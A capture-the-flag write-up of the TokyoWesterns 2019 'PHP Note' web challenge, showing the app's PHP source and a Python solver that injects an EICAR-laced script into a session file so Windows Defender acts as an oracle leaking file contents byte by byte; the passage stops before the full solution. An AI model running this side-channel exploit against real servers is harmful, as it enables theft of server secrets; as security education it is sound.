---
title: "TokyoWesterns PHP Note (Web, 320 pts, 18 solves)"
date: 2019-09-03
categories: [writeup]
tags: [writeups, web, side-channel, defender, twctf19]
---
*Author: 0x6e6576657220676f6e6e61*

## 0x00 Challenge Setup

As is CTF tradition, we have yet another "Notes" app we have to break in some
way. And they're kind enough to provide the source code to help take some of the
guessing out of the challenge.

```php
 <?php
include 'config.php';

class Note {
    public function __construct($admin) {
        $this->notes = array();
        $this->isadmin = $admin;
    }

    public function addnote($title, $body) {
        array_push($this->notes, [$title, $body]);
    }

    public function getnotes() {
        return $this->notes;
    }

    public function getflag() {
        if ($this->isadmin === true) {
            echo FLAG;
        }
    }
}

function verify($data, $hmac) {
    $secret = $_SESSION['secret'];
    if (empty($secret)) return false;
    return hash_equals(hash_hmac('sha256', $data, $secret), $hmac);
}

function hmac($data) {
    $secret = $_SESSION['secret'];
    if (empty($data) || empty($secret)) return false;
    return hash_hmac('sha256', $data, $secret);
}

function gen_secret($seed) {
    return md5(SALT . $seed . PEPPER);
}

function is_login() {
    return !empty($_SESSION['secret']);
}

function redirect($action) {
    header("Location: /?action=$action");
    exit();
}

$method = $_SERVER['REQUEST_METHOD'];
$action = $_GET['action'];

if (!in_array($action, ['index', 'login', 'logout', 'post', 'source', 'getflag'])) {
    redirect('index');
}

if ($action === 'source') {
    highlight_file(__FILE__);
    exit();
}


session_start();

if (is_login()) {
    $realname = $_SESSION['realname'];
    $nickname = $_SESSION['nickname'];

    $note = verify($_COOKIE['note'], $_COOKIE['hmac'])
            ? unserialize(base64_decode($_COOKIE['note']))
            : new Note(false);
}

if ($action === 'login') {
    if ($method === 'POST') {
        $nickname = (string)$_POST['nickname'];
        $realname = (string)$_POST['realname'];

        if (empty($realname) || strlen($realname) < 8) {
            die('invalid name');
        }

        $_SESSION['realname'] = $realname;
        if (!empty($nickname)) {
            $_SESSION['nickname'] = $nickname;
        }
        $_SESSION['secret'] = gen_secret($nickname);
    }
    redirect('index');
}

if ($action === 'logout') {
    session_destroy();
    redirect('index');
}

if ($action === 'post') {
    if ($method === 'POST') {
        $title = (string)$_POST['title'];
        $body = (string)$_POST['body'];
        $note->addnote($title, $body);
        $data = base64_encode(serialize($note));
        setcookie('note', (string)$data);
        setcookie('hmac', (string)hmac($data));
    }
    redirect('index');
}

if ($action === 'getflag') {
    $note->getflag();
}

?>
<!doctype html>
<html>
    <head>
        <title>PHP note</title>
    </head>
    <style>
        textarea {
            resize: none;
            width: 300px;
            height: 200px;
        }
    </style>
    <body>
        <?php
        if (!is_login()) {
            $realname = htmlspecialchars($realname);
            $nickname = htmlspecialchars($nickname);
        ?>
        <form action="/?action=login" method="post" id="login">
            <input type="text" id="firstname" placeholder="First Name">
            <input type="text" id="lastname" placeholder="Last Name">
            <input type="text" name="nickname" id="nickname" placeholder="nickname">
            <input type="hidden" name="realname" id="realname">
            <button type="submit">Login</button>
        </form>
        <?php
        } else {
        ?>
        <h1>Welcome, <?=$realname?><?= !empty($nickname) ? " ($nickname)" : "" ?></h1>
        <a href="/?action=logout">logout</a>
        <!-- <a href="/?action=source">source</a> -->
        <br/>
        <br/>
        <?php
            foreach($note->getnotes() as $k => $v) {
                list($title, $body) = $v;
                $title = htmlspecialchars($title);
                $body = htmlspecialchars($body);
        ?>
        <h2><?=$title?></h2>
        <p><?=$body?></p>
        <?php
            }
        ?>
        <form action="/?action=post" method="post">
            <input type="text" name="title" placeholder="title">
            <br>
            <textarea name="body" placeholder="body"></textarea>
            <button type="submit">Post</button>
        </form>
        <?php
        }
        ?>
        <?php
        ?>
        <script>
            document.querySelector("form#login").addEventListener('submit', (e) => {
                const nickname = document.querySelector("input#nickname")
                const firstname = document.querySelector("input#firstname")
                const lastname = document.querySelector("input#lastname")
                document.querySelector("input#realname").value = `${firstname.value} ${lastname.value}`
                if (nickname.value.length == 0 && firstname.value.length > 0 && lastname.value.length > 0) {
                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()
                }
            })
        </script>
    </body>
</html>
```

This is quite a compact application, the bulk of the PHP source code only runs
113 lines, 20 being a class definition. Not a lot to work with. The important
bits are:


```php
if (is_login()) {
    $realname = $_SESSION['realname'];
    $nickname = $_SESSION['nickname'];

    $note = verify($_COOKIE['note'], $_COOKIE['hmac'])       <- [3]
            ? unserialize(base64_decode($_COOKIE['note']))   <- [1]
            : new Note(false);
}
```
```php
class Note {
    public function __construct($admin) {
        $this->notes = array();
        $this->isadmin = $admin;
    }

    public function addnote($title, $body) {
        array_push($this->notes, [$title, $body]);
    }

    public function getnotes() {
        return $this->notes;
    }

    public function getflag() {
        if ($this->isadmin === true) {
            echo FLAG;
        }
    }
}

[...]

if ($action === 'getflag') {
    $note->getflag();        <- [2]
}

```

Here we can see the target, we need to somehow forge a `Note` object that has
the `$this->isadmin` field set to true. We can see at **[1]** that we can supply a
base64 encoded serialised PHP object which gets unserialised and used as the
object to call `getflag()` on **[2]**. However this is guarded **[3]** with a
verify function:

```php
function verify($data, $hmac) {
    $secret = $_SESSION['secret'];
    if (empty($secret)) return false;
    return hash_equals(hash_hmac('sha256', $data, $secret), $hmac);
}
```

This is a [HMAC check](https://en.wikipedia.org/wiki/HMAC), without knowing
`$secret` we can't forge a malicious `Note` object with `isadmin` set to true.
We can see the secret is derived from one of our login inputs:

```php
function gen_secret($seed) {
    return md5(SALT . $seed . PEPPER);
}
[...]
if ($action === 'login') {
    if ($method === 'POST') {
        $nickname = (string)$_POST['nickname'];
        $realname = (string)$_POST['realname'];

        if (empty($realname) || strlen($realname) < 8) {
            die('invalid name');
        }

        $_SESSION['realname'] = $realname;
        if (!empty($nickname)) {
            $_SESSION['nickname'] = $nickname;
        }
        $_SESSION['secret'] = gen_secret($nickname);  <- [4]
    }
    redirect('index');
}
```

The secret is generated at **[4]** from the `nickname` we give in the inital
login. It's salted (and peppered) before being hashed using md5. Without the
`SALT` and `PEPPER` values, we can't work out the secret to forge a `Note`.

One other odd thing, it seems the challenge is hosted on `IIS/8.0` --- this means
we're attacking a Windows OS. This is somewhat weird, web servers are almost
exclusively Linux based and use Nginx or Apache as their server application of
choice. I'm sure it won't be relevant...

## 0x01 Windows Defender? More like Windows Defendon't

We can't bruteforce `SALT` and `PEPPER` (been there, done that), so we need to
find a way to leak the secret itself or use some crypto dark magic to produce a
matching HMAC for a forged `Note`. The key was using a presentation from the
same team who ran the CTF, TokyoWesterns and their new [exploit
technique](https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf).
Portswigger did a
[summary](https://portswigger.net/daily-swig/av-oracle-new-hacking-technique-leverages-antivirus-to-steal-secrets)
on their slides, describing the new method as:
>**A specialized server-side request forgery (SSRF) technique** that takes
>advantage of the security mechanisms embedded in Windows Defender

A nice summary, except it's **_incorrect_**. Whilst the slides _do_ show it being used in a
SSRF context, but it's not a SSRF technique! I should have read the source material
better since I discarded this technique early on despite most signs pointing to
it because I thought it was SSRF dependent! The Defender Technique is actually
more akin to a Local File Disclosure Portswigger why you gotta do me
dirty :(?

The Defender Leaks is an interesting one, it's in the same vein as the [35c3
Challenge](https://gist.github.com/l4wio/3a6e9a7aea5acd7a215cdc8a8558d176) which
involved abusing defensive security software to leak internal information. The Defender
flaw is that it will execute any Javascript it just finds lying around in files that
gets read from disk! We can abuse the
[EICAR](https://en.wikipedia.org/wiki/EICAR_test_file) (and JavaScript) test file to leak
information about characters in files on disk. See!? No SSRF involved. The catch
is that we need to be able to write user controlled data to a file. But the PHP
script doesn't write anything? Whilst that it's true that the PHP script doesn't
create any extra files, the PHP interpreter _does_.

## 0x02 Docker? I hardly knew her

I find it a good idea, when doing challenges with source code available, to host
it locally so I can get a better idea of what's going on. Using docker we can
quite nicely setup a dev ctf environment:

```
docker run --rm -p 80:80 --name php_ctf -v "$PWD":/var/www/html php:7.2-apache
```

This will spin up an Apache server with PHP enabled. If you run this in the same
directory as the source code of the challenge saved as `index.php`you can browse
to `http://localhost` to see it live. After logging into the site, we see that
PHP stores our sessions files in `/tmp`

```
$ docker exec -it my-apache-php-app ls -al /tmp

drwxrwxrwt 1 root     root     4096 Sep  5 00:45 .
drwxr-xr-x 1 root     root     4096 Sep  5 00:44 ..
-rw------- 1 www-data www-data   98 Sep  5 00:45 sess_9bbcc104b32fbcac0edafd9cb0432991
```

Reading the file:
```
$ docker exec -it my-apache-php-app cat /tmp/sess_9bbcc104b32fbcac0edafd9cb0432991

realname|s:14:"Hello There...";nickname|s:14:"General Kenobi";secret|s:32:"742de24238d4adc573b03a2b3589c5e5";
```

We can see the session file contents, This is exactly what a Defender leak needs! A file on disk that gets read per
user request which contains user controlled data and some secret we want to get
our hands on. We can use a `realname` that contains a `<script>` tag and trigger
Windows Defender to execute the Javascript in the context of the file!

We can modifiy the solution script that's in the TokyoWesterns
[repo](https://github.com/icchy/wctf2019-gtf/blob/master/solver/solve.py) to
work with this challenge:

```python
import requests
import string

URL = "http://localhost" # Change this to challenge URL

def randstr(n=8):
    import random
    import string
    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join([random.choice(chars) for _ in range(n)])

def trigger(c, idx):
    print("[*] Triggering on {}[{}] at index {}".format(chr(c), c, idx))
    prefix = randstr()

    p = prefix + '''<html><script>f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script>'''

    p = string.Template(p).substitute({'idx': idx, 'c': c})

    sess = requests.session()
    data = {
        "realname": "{}<body>".format(p),
        "nickname": "HACKX</body>",
    }

    sess.post(URL + '/?action=login', data=data)
    return sess.get(URL + "/?action=getflag").status_code

def leak(idx):
    l, h = 0, 0x100
    while h - l > 1:
        m = (h + l) // 2

        if trigger(m, idx) == 500:
            l = m
        else:
            h = m

    return chr(l)

data = ''
for i in range(30):
    data += leak(i)
    print(data)
```

Running this and checking the state of the session file now, we can see the
format it gives us on disk:

```php
$ docker exec -it my-apache-php-app cat /tmp/sess_0bb85a780cb24c778ac77a16fc4c866a

realname|s:196:"pzvpUGnz<html><script>f=function(n){eval('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H'+{8:'*'}[Math.min(8,n)])};f(document.body.innerHTML[0].charCodeAt(0));</script><body>";nickname|s:19:"HACKX</body><title>";secret|s:32:"e81958d8cc55411d0c2576c15aae23d2";
```

Since this looks dodgy, Defender executes this Javascript inside itself, we can then use our
ability to access `document.body.innerHTML` as an oracle and leak byte by byte
characters between the `<body>` tags! That's pretty cool, leaking a file from
disk using an antivirus. However we aren't done just yet, leaking stuff between
body is completely useless :(, since the only things between the two `<body>`
tags is data we've sent and the `nickname` string. So close!
